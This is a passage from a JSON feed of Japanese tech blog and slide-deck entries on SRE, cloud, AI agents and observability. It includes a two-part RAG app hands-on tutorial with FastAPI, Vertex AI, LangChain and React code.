https://zenn.dev/hidenorigoto/articles/38b22a2ccbeac6\\r    - Claude Code版Orchestratorで複雑なタスクをステップ実行する https://zenn.dev/mizchi/articles/claude-code-orchestrator\\r    - Agentic Coding Recommendations https://lucumr.pocoo.org/2025/6/12/agentic-coding/\\r    - Claude Codeに保守しやすいコードを書いてもらうための事前準備 https://www.memory-lovers.blog/entry/2025/06/12/074355\\r    - Claude Codeによる技術的特異点を見届けろ https://zenn.dev/mizchi/articles/claude-code-singularity-point","isoDate":"2025-06-18T04:00:00.000Z","dateMiliSeconds":1750219200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SRE支援から見えてきたSREの核","link":"https://speakerdeck.com/kojake_300/srezhi-yuan-karajian-etekitasrenohe","contentSnippet":"","isoDate":"2025-06-12T04:00:00.000Z","dateMiliSeconds":1749700800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Open Policy Containers(OPC)","link":"https://zenn.dev/tayusa/articles/2ade4dd1928937","contentSnippet":"Open Policy Containers(OPC)の前にOpen Policy Agent(OPA)https://www.openpolicyagent.org/クラウドネイティブ環境におけるポリシー適用のための汎用エンジンRegoという宣言型言語を用いてポリシーを記述するJSONやYAMLのような構造化されたデータを入力として受け取り、ポリシー評価の結果（許可/拒否など）を返す例: 全てのNamespaceに管理者を特定するためのownerラベルを必須にするpackage maindeny contains msg if {    # 対象リソース...","isoDate":"2025-06-12T02:27:15.000Z","dateMiliSeconds":1749695235000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～","link":"https://sreake.com/blog/oracle-database-google-cloud-japan-launch/","contentSnippet":"2025年4月のGoogle Cloud Nextでの発表から2か月、ついにOracle Database＠Google CloudがTokoy・Osakaリージョンで利用可能になりました。 Oracle Databas […]The post Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-06T10:48:27.000Z","dateMiliSeconds":1749206907000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GoogleのAI Agent","link":"https://speakerdeck.com/shukob/googlenoai-agent","contentSnippet":"2025年5月30日(金) AI Agent 勉強会 Vol.3 にて、\\rGoogle CloudのAI Agentサービスと\\rGoogle I/O 2025 で発表された内容の概要を紹介させていただきました。\\rhttps://almondo.connpass.com/event/355297/","isoDate":"2025-05-30T04:00:00.000Z","dateMiliSeconds":1748577600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装","link":"https://sreake.com/blog/image-creation-and-execution-with-go-containerregistry/","contentSnippet":"この記事ではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過 […]The post Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-29T00:40:36.000Z","dateMiliSeconds":1748479236000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AIコードエディタは開発を変えるか？Cursorをチームに導入して1ヶ月経った本音","link":"https://speakerdeck.com/ota1022/aikodoedeitahakai-fa-wobian-eruka-cursorwotimunidao-ru-site1keyue-jing-tutaben-yin","contentSnippet":"2025年5月28日 Qiita Bash 最近ハマっている生成AI活用法を語ろう！のLT登壇資料です。\\rhttps://increments.connpass.com/event/351227/","isoDate":"2025-05-28T04:00:00.000Z","dateMiliSeconds":1748404800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"ディレクトリ構成 ~フィーチャーベース編~","link":"https://sreake.com/blog/feature-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「機能ごとに整理しやすく、拡張にも強い」フィーチャーベース構成を […]The post ディレクトリ構成 ~フィーチャーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T02:18:09.000Z","dateMiliSeconds":1748398689000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RedisのPub/Subを使用したリアルタイム通知の実現","link":"https://sreake.com/blog/realtime-notification-with-redis-pubsub/","contentSnippet":"はじめに Sreake事業部のアプリケーションエンジニアの角谷です。 リアルタイム通信を実現する手段は様々ありますが、その一つにPub/Subがあります。 Pub/Subを実装する方法は様々ありますが、今回はRedisを […]The post RedisのPub/Subを使用したリアルタイム通知の実現 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T01:18:04.000Z","dateMiliSeconds":1748395084000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RAGアプリ開発ハンズオン（後編：フロントエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/05/26/185645","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。前回資料shu-kob.hateblo.jp前回の課題retriever_service を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。llm_serviceでretriever_serviceを使うようにします。@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp↓@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    context_resp = retriever_service(question)    context = context_resp[\'search_result\']    print(context)    template = \\"\\"\\"質問: {question}    以下の情報を参考にして、質問に答えてください。    {context}    \\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question, \\"context\\": context}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp以下も行っておくと便利です。.envを作成DISCOVERY_ENGINE_ID=XXXXXXXXXXXXX以下の行を main.pyに追記from dotenv import load_dotenvload_dotenv()engine_idの行を変更@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\'↓@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = os.environ[\'DISCOVERY_ENGINE_ID\']動作確認QUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .参考）ソースコード差分retriever_serviceで得た検索結果をcontextに by shu-kob \xb7 Pull Request #4 \xb7 shu-kob/rag-app-handson \xb7 GitHubフロントエンドの実装フォルダ整理これまでバックエンドを追加してきたのと同じリポジトリでフロントエンドも管理いたします。そのためにこれまで追加してきたファイルをバックエンド用のフォルダに移動させます。mkdir backend# 下記以外にも必要なファイル、フォルダはbackendに移動してください。# - __pycache__とfastapi-envは削除してください。# - .gitがある場合は移動も削除もしないでください。mv *.md *.py *.txt .env backendアプリ作成アプリの雛形を作成し、起動を確認します。npx --yes create-react-router@latest --install --no-git-init frontendcd frontendnpm run devブラウザでhttp://localhost:5173/を開いてReact Routerの画面が表示されればOKです。画面を変更してみる見た目を定義しているコンポーネントはfrontend/app/welcome/welcome.tsxです。Welcomeコンポーネントを以下のように変更します。export function Welcome() {  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}            >              送信            </button>          </div>        </div>      </div>    </main>  );}画面に入力欄とボタンが表示されればOKです。入力をコントロールする上記で入力欄に文字を入力することはできますが、その値はブラウザ側で管理されており、Reactアプリ側では取得できません。そこでstateを用いてアプリ側で入力を制御します。import { useState } from \\"react\\";export function Welcome() {  const [input, setInput] = useState(\\"\\");  const onSend = () => {    console.log(input)  }  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}              value={input}              onChange={(e) => setInput(e.target.value)}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}              onClick={onSend}            >              送信            </button>          </div>        </div>      </div>    </main>  );}テキストを入力して送信ボタンをクリックするとログにテキストの内容が表示されるようになります。ログの確認はブラウザの開発者ツールで行います。バックエンドとの接続フロントエンドはバックエンドと異なるオリジンで動かしているため、CORSエラーにならないようバックエンドを修正します。backend/main.pyに以下を追加してください。# CORSミドルウェアの設定from fastapi.middleware.cors import CORSMiddlewareapp.add_middleware(    CORSMiddleware,    allow_origins=[\\"*\\"],  # すべてのオリジンを許可    allow_credentials=True,    allow_methods=[\\"*\\"],  # すべてのメソッドを許可    allow_headers=[\\"*\\"],  # すべてのヘッダーを許可    expose_headers=[\\"*\\"]  # すべてのヘッダーを公開)変更後、バックエンドを起動します。python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activateuvicorn main:app --reload送信ボタンが押された際に入力されたテキストをバックエンドに送信し、生成AIの回答を取得できるようにします。レスポンスの確認はブラウザの開発者ツールで行います。  const onSend = () => {    fetch(\\"http://localhost:8000/api/llm\\", {      method: \\"POST\\",      headers: {        \\"Content-Type\\": \\"application/json\\",      },      body: JSON.stringify({ query: input }),    })  }演習バックエンドのResponseを画面に表示させましょう例バックエンドからのresponseをフロントエンドに表示 by shu-kob \xb7 Pull Request #6 \xb7 shu-kob/rag-app-handson \xb7 GitHub","isoDate":"2025-05-26T09:56:45.000Z","dateMiliSeconds":1748253405000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Vertex AI Agent Engine のカスタムテンプレートでセッション機能付きチャットボットを作る","link":"https://zenn.dev/kimitsu/articles/agent-angine-custom-agent","contentSnippet":"Vertex AI Agent Engine は AI エージェントを構築・デプロイするための Google Cloud のマネージドサービスです。[1]以下のフレームワークに対してはテンプレートが用意されており、簡単にデプロイすることができます。Agent Development KitLangChainLangGraphAG2LlamaIndexまた上記に挙げられていないフレームワークについても、カスタムテンプレートを作成することでデプロイすることができます。今回はカスタムテンプレートを用いて、セッション機能付きの AI チャットボットを実装してみます。なお本記...","isoDate":"2025-05-26T07:02:31.000Z","dateMiliSeconds":1748242951000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"TerragruntでTerraformをいい感じに管理する","link":"https://zenn.dev/kojake_300/articles/9b008349fa8310","contentSnippet":"はじめに皆さんはTerraformをどのような管理していますか？最近では、Google Cloudがベストプラクティス[1]を公開していたり、FUTURE社が設計ガイドライン[2]を提供していたりと、Terrafromの設計・開発ガイドラインは成熟して来ているのではないでしょうか。それでも、何となくもっと良い管理の方法はないかなあ？ と思ったことはありませんか。そんなTerraform Loverに送る、Terragruntというツールを紹介します。 Terraformの課題基本的なTerraformのディレクトリ構成を以下に示します。AWSリソースを管理することを想定と...","isoDate":"2025-05-25T14:05:00.000Z","dateMiliSeconds":1748181900000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Google Cloud の生成 AI オブザーバビリティ機能まとめ","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-o11y","contentSnippet":"生成 AI アプリケーションにおけるオブザーバビリティの必要性ここ数年の生成 AI 技術の発展に伴い、RAG や AI エージェントなど生成 AI のアプリケーションへの応用が進んでいます。一方で生成 AI アプリケーションを本番利用していくにあたっては以下のような課題があります。確率的な挙動モデルの出力生成にかかる時間トークンに対する課金額外部サービス呼び出し（RAG であれば検索サービス、AI エージェントであればツール）実行経路（ワークフロー型エージェントの場合）モデルの更新、プロンプトの更新これらの課題に対し、生成 AI アプリケーションにおいて...","isoDate":"2025-05-24T09:01:25.000Z","dateMiliSeconds":1748077285000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Snowflakeで始めるデータガバナンス","link":"https://sreake.com/blog/getting-started-with-data-governance-in-snowflake/","contentSnippet":"はじめに データ分析において、データガバナンスは必要不可欠な取り組みの1つと言って過言ではないでしょう。 今回は「Snowflakeで始めるデータガバナンス」と題しまして、新規既存関係なく、どのタイミングからでも導入可能 […]The post Snowflakeで始めるデータガバナンス first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-23T01:15:59.000Z","dateMiliSeconds":1747962959000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【小ネタ】Linux 6.15でExFATのファイル削除が高速化された話","link":"https://dev.mix64.com/2025/05/22/linux6-15-exfat/","contentSnippet":"今回はLinux 6.15で高速化されたexFATのファイル削除処理について、ソースコードベースで改善点を解説します。 結論 だれも使わない...","isoDate":"2025-05-21T16:01:03.000Z","dateMiliSeconds":1747843263000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Pod Resource動的リサイズの検証","link":"https://sreake.com/blog/kubernetes-pod-resource-dynamic-resize/","contentSnippet":"Kubernetesでは、アプリケーションの可用性や運用効率を高めるため、リソース変更時のダウンタイムを極力抑える取り組みが進んでいます。従来、CPU やメモリのリソースを変更する際には、Pod の再作成やコンテナ再起動 […]The post Pod Resource動的リサイズの検証 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-20T08:38:25.000Z","dateMiliSeconds":1747730305000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【ドキュメントを追え! mitmproxy編】 第1話 いかにして中間者になるかHTTP編","link":"https://www.rowicy.com/blog/mitmproxy-doc-read-01/","contentSnippet":"mitmproxyのドキュメントを読んで自分で調べた補足をまとめました","isoDate":"2025-05-20T00:00:00.000Z","dateMiliSeconds":1747699200000,"authorName":"riiim","authorId":"riiim"},{"title":"React Tokyo LT大会「ストリームの実装」","link":"https://speakerdeck.com/shukob/react-tokyo-ltda-hui-sutorimunoshi-zhuang","contentSnippet":"2025年5月17日React Tokyo LT大会にて、生成AIアプリケーションなどでよく使う「ストリーム実装」について話しました。\\rhttps://react-tokyo.connpass.com/event/350715/","isoDate":"2025-05-17T04:00:00.000Z","dateMiliSeconds":1747454400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google CloudのAI Agent関連のサービス紹介","link":"https://speakerdeck.com/shukob/google-cloudnoai-agentguan-lian-nosabisushao-jie","contentSnippet":"https://3-shake.connpass.com/event/351861/\\r3-shake SRE Tech Talk #12 にて、\\rGoogle CloudのAI Agent関連のサービス紹介を行いました\\r・Vertex AI Agent Builder\\r・Agent Garden\\r・Agent Engine\\r・Vertex AI Search\\r・Agentspace\\rなど","isoDate":"2025-05-16T04:00:00.000Z","dateMiliSeconds":1747368000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"学ぶ・つながる・挑戦する ~ 大学から始めるセキュリティの学び~/security_learning","link":"https://speakerdeck.com/moz_sec_/security-learning","contentSnippet":"2025年5月15日に行われたランチタイムトークで登壇した資料です。","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"転職したらMCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","contentSnippet":"本日、Forkwell さんに悪ふざけに付き合ってもらってイベントやりました。ありがとうございます。「転職したらMCPサーバーだった件」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 転職したらMCPサーバーだった件\\r- 公式URL: https://forkwell.connpass.com/event/354289/\\r- ハッシュタグ: https://x.com/search?q=%23Forkwell_MCP&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae\\r- 参考資料②: https://syu-m-5151.hatenablog.com/entry/2025/03/09/020057\\r- 参考資料③: https://speakerdeck.com/superbrothers/that-time-i-changed-jobs-as-a-kubernetes","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AIエージェントのオブザーバビリティについて","link":"https://speakerdeck.com/yunosukey/aiezientonoobuzababiriteinituite","contentSnippet":"","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』","link":"https://sreake.com/blog/introduction-long-context-llms-meet-rag/","contentSnippet":"RAG（Retrieval Augmented Generation）は、LLM（Large Language Model：大規模言語モデル）が知らない情報を外部から与えてあげることで、LLMの知識を拡張する手法です。R […]The post 論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-15T01:01:02.000Z","dateMiliSeconds":1747270862000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenTelemetry + LLM = OpenLLMetry!?","link":"https://speakerdeck.com/yunosukey/opentelemetry-plus-llm-equals-openllmetry","contentSnippet":"","isoDate":"2025-05-14T04:00:00.000Z","dateMiliSeconds":1747195200000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SSHの基本を理解したい(シーケンス図付き)","link":"https://zenn.dev/meziron/articles/a42cef62e06a68","contentSnippet":"1. 初回 SSH 接続時の流れ (秘密鍵のパスフレーズ入力あり)このシナリオでは、ユーザーが初めて特定のサーバーに SSH 接続を試みるか、あるいは SSH エージェントにまだ該当の秘密鍵がロードされていない状況を想定します。秘密鍵はパスフレーズで保護されているものとします。 登場人物User: 操作を行うユーザーSSH_Client: ユーザーが操作する SSH クライアント（例: sshコマンド）SSH_Agent: SSH エージェントプロセス（秘密鍵をメモリに保持）SSH_Server: 接続先の SSH サーバー 初回接続時の流れのポイント...","isoDate":"2025-05-12T00:00:05.000Z","dateMiliSeconds":1747008005000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GitHub Actionsから踏み台経由でプライベートCloud SQLに接続 (OS Login + WIF + SSHトンネル編)","link":"https://zenn.dev/meziron/articles/369504c9d84eba","contentSnippet":"GitHub Actionsから踏み台サーバー経由でプライベートCloud SQLに接続する実践ガイド (OS Login + WIF + SSHトンネル編)CI/CDパイプライン、特にGitHub Actionsから、VPCのプライベートネットワーク内に配置されたCloud SQLデータベースへ安全かつ自動的に接続したい、というニーズは多いのではないでしょうか？この記事では、Workload Identity Federation (WIF), OS Login そして gcloud compute ssh (beta) を組み合わせた、管理しやすい接続方法を解説します。 1...","isoDate":"2025-05-08T08:55:26.000Z","dateMiliSeconds":1746694526000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"クラウドネイティブ環境の脅威モデリング","link":"https://speakerdeck.com/kyohmizu/kuraudoneiteibuhuan-jing-noxie-wei-moderingu","contentSnippet":"イベント登壇資料です。2025/05/08 #TMCTokyo\\rhttps://lu.ma/tmc-tokyo-meetup-2025-05","isoDate":"2025-05-08T04:00:00.000Z","dateMiliSeconds":1746676800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策","link":"https://sreake.com/blog/fastapi-error-handling-basics/","contentSnippet":"こんにちは。Sreake事業部の安本篤史（atusy）です。 APIサーバーの実装では、プログラムエラーをハンドリングして、クライアントエラーやサーバーエラーを適切にレスポンスすることが求められます。 同時に、エラーに関 […]The post FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-08T03:03:29.000Z","dateMiliSeconds":1746673409000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Argo CDのセットアップ方法を解説してみる","link":"https://zenn.dev/kamos/articles/0e1e6af0700f14","contentSnippet":"はじめにArgo CDとは、Kubernetesのための継続的デリバリー（CD）ツールです。GitOpsの原則に従い、Gitリポジトリの状態をKubernetesクラスターに同期させることができます。これにより、アプリケーションのデプロイメントや管理が容易になります。Kubernetes環境では広く利用されているArgo CDですが、Argo CD自体のセットアップ方法はいくつかの方法があります。ここでは、Argo CDの初期セットアップについて解説します。 Argo CDの初期セットアップArgo CDを利用可能にするには、以下の手順が必要になります。Argo CD ...","isoDate":"2025-05-07T02:18:03.000Z","dateMiliSeconds":1746584283000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"A2AサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-a2a","contentSnippet":"A2A におけるオブザーバビリティの必要性A2A[1]は Google が主導し開発を進めている、エージェント間の通信を可能にするオープンプロトコルです。A2A を利用することで生成 AI アプリケーションはマルチエージェントシステムとして実装されます。マルチエージェントシステムは分散システムであり、マイクロサービスと同様にオブザーバビリティが重要となります。小さなエージェントであればわざわざ A2A でクライアントとサーバに分ける必要はありませんが、エージェントが巨大化すれば従来の Web アプリケーションの潮流と同様に分割される方向で進化するでしょう。本記事ではA2Aサ...","isoDate":"2025-05-05T10:46:15.000Z","dateMiliSeconds":1746441975000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"MCPサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-mcp","contentSnippet":"MCP におけるオブザーバビリティの必要性MCP の利用方法として現時点では以下がよくあると思います。MCP サーバをローカルで動かしているサードパーティーのリモートサーバを使っているクライアントがローカルアプリ上記の場合にはオブザーバビリティは比較的重要ではありません。一方で、以下のような場合にはMCP においてもオブザーバビリティが重要です。Web アプリケーションが MCP クライアント（例えば生成 AI アプリ）MCP サーバを自作しているこのような状況では MCP クライアントと MCP サーバは、マイクロサービスで構成されたアプリケーションとして...","isoDate":"2025-05-05T07:33:24.000Z","dateMiliSeconds":1746430404000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"PR概要作成・コード改善提案ツール PR-Guardianのご紹介","link":"https://sreake.com/blog/pr-guardian-introduction/","contentSnippet":"はじめに はじめまして、Sreake事業部でインターンをしている村山です。 今回は、PR Guardianというツールの開発と検証をしました。PR GuardianはPull Requestの概要の作成、コードの改善提案 […]The post PR概要作成・コード改善提案ツール PR-Guardianのご紹介 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T08:07:36.000Z","dateMiliSeconds":1746000456000,"authorName":"Sreake","authorId":"Sreake"},{"title":"NVIDIA NIMを使ってみた","link":"https://sreake.com/blog/trying-out-nvidia-nim/","contentSnippet":"NIMとは NVIDIA Inference Microservicesの頭文字をとってNIMです。迅速なエンタープライズ対応デプロイメントのためのマイクロサービスを提供してくれます。NVIDIAのGPUで動かすことに最 […]The post NVIDIA NIMを使ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T06:13:57.000Z","dateMiliSeconds":1745993637000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RustでLSMツリーを実装してみた","link":"https://zenn.dev/sraku/articles/25ead9b5012c15","contentSnippet":"概要CassandraやScyllaDBといったKVSで使用されているLSMツリーを簡単に実装してみたので、簡単にお話ししていきたいと思いますこちらがリポジトリですhttps://github.com/sraku2159/lsmtree実装のお話をする前に簡単にLSMツリーについてお話ししていきたいと思います LSMツリーとはLSMツリーとはLog Structre Merge ツリーの略で以下の四つのコンポーネントから構成されます。MemtableCommitLogSSTableコンパクション以下、ScyllaDBのちょー親切なドキュメントから拝借した画...","isoDate":"2025-04-29T10:09:14.000Z","dateMiliSeconds":1745921354000,"authorName":"Sota Nakano","authorId":"sraku"},{"title":"RAGアプリ開発ハンズオン（前編：バックエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/04/28/185621","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。ソースコードgithub.comFastAPIの準備python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activatepip install fastapi uvicorntouch main.pyfrom fastapi import FastAPIapp = FastAPI()@app.get(\'/\')def index():  return \'hello\'実行uvicorn main:app --reload別ターミナルにてcurl -s http://localhost:8000/POSTも追加from pydantic import BaseModelclass User(BaseModel):    name: str@app.post(\'/api/hello\')def hello_service(user: User):    resp = { \'message\': \'Hello, {}!\'.format(user.name) }    return respUSER=\'{\\"name\\":\\"平賀源内\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$USER\\" -s http://localhost:8000/api/hello | jq .Google Cloudでサービスアカウントの準備Geminiマルチモーダルプログラミングハンズオン - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、ロールへVertex AI ユーザーディスカバリー エンジン ユーザーを追加し、環境変数の設定Geminiを呼び出すコードを記載main.pyの上に以下を追加import vertexaifrom vertexai.generative_models import GenerativeModelmain.pyの下に以下を追加class Question(BaseModel):    query: str@app.post(\'/api/llm\')def llm_service(question: Question):    prompt = question.query    vertexai.init(location=\\"us-west1\\") # vertexaiの初期化で、ロケーションを設定    model = GenerativeModel(\\"gemini-2.0-flash-001\\") # モデルを設定    response = model.generate_content( # プロンプトをモデルに入れて出力(レスポンスを得る)        prompt    )    print(response.text) # コンソールログにresponseのテキストを表示    resp = { \'answer\': response.text } # responseを形作る    return respライブラリのインストールrequirements.txtに以下を記載google-cloud-aiplatform==1.83.0vertexai==1.43.0langchain_core==0.3.33langchain_google_vertexai==2.0.12google===3.0.0google-cloud-discoveryengine==0.13.6pip install -r requirements.txt--break-system-packagesをつけよ、とエラーが出たら以下pip install --user -r requirements.txt --break-system-packages実行方法uvicorn main:app --reload別ターミナルにてQUESTION=\'{\\"query\\":\\"プロンプトエンジニアリングとは何ですか？\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .LangChainを用いるimport vertexai # 削除from vertexai.generative_models import GenerativeModel # 削除from langchain_google_vertexai import VertexAI # 追記from langchain_core.prompts import PromptTemplate # 追記@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return respRAG構築Google Cloud Vertex AI Agent Builderの使い方 - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、Google Cloud Storageにドキュメントを格納し、Agent Builderで検索アプリを作ります。main.pyの上に追記from google.api_core.client_options import ClientOptionsfrom google.cloud import discoveryengine_v1 as discoveryengineimport osimport google.authcredentials, project_id = google.auth.default()main.pyの下に追記\'DISCOVERY_ENGINE_ID\'を書き換えます@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\' # AI Applicationsで作成したアプリケーションのIDに変更する    def search(        project_id: str,        location: str,        engine_id: str,        search_query: str,    ) -> discoveryengine.services.search_service.pagers.SearchPager:        client_options = (            ClientOptions(api_endpoint=f\\"{location}-discoveryengine.googleapis.com\\")            if location != \\"global\\"            else None        )        client = discoveryengine.SearchServiceClient(client_options=client_options)        serving_config = f\\"projects/{project_id}/locations/{location}/collections/default_collection/engines/{engine_id}/servingConfigs/default_config\\"        content_search_spec = discoveryengine.SearchRequest.ContentSearchSpec(            snippet_spec=discoveryengine.SearchRequest.ContentSearchSpec.SnippetSpec(                return_snippet=True            ),            summary_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec(                summary_result_count=3,                include_citations=True,                ignore_adversarial_query=True,                ignore_non_summary_seeking_query=True,                model_prompt_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelPromptSpec(                    preamble=\\"文献の検索結果を要約してください\\"                ),                model_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelSpec(                    version=\\"stable\\",                ),            ),        )        request = discoveryengine.SearchRequest(            serving_config=serving_config,            query=search_query,            page_size=3,            content_search_spec=content_search_spec,            query_expansion_spec=discoveryengine.SearchRequest.QueryExpansionSpec(                condition=discoveryengine.SearchRequest.QueryExpansionSpec.Condition.AUTO,            ),            spell_correction_spec=discoveryengine.SearchRequest.SpellCorrectionSpec(                mode=discoveryengine.SearchRequest.SpellCorrectionSpec.Mode.AUTO            ),        )        page_result = client.search(request)        return page_result    response = search(project_id, location, engine_id, search_query)    resp = { \'search_result\': response.summary.summary_text }    print(resp)    return respQUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/retriever | jq .課題retriever_service 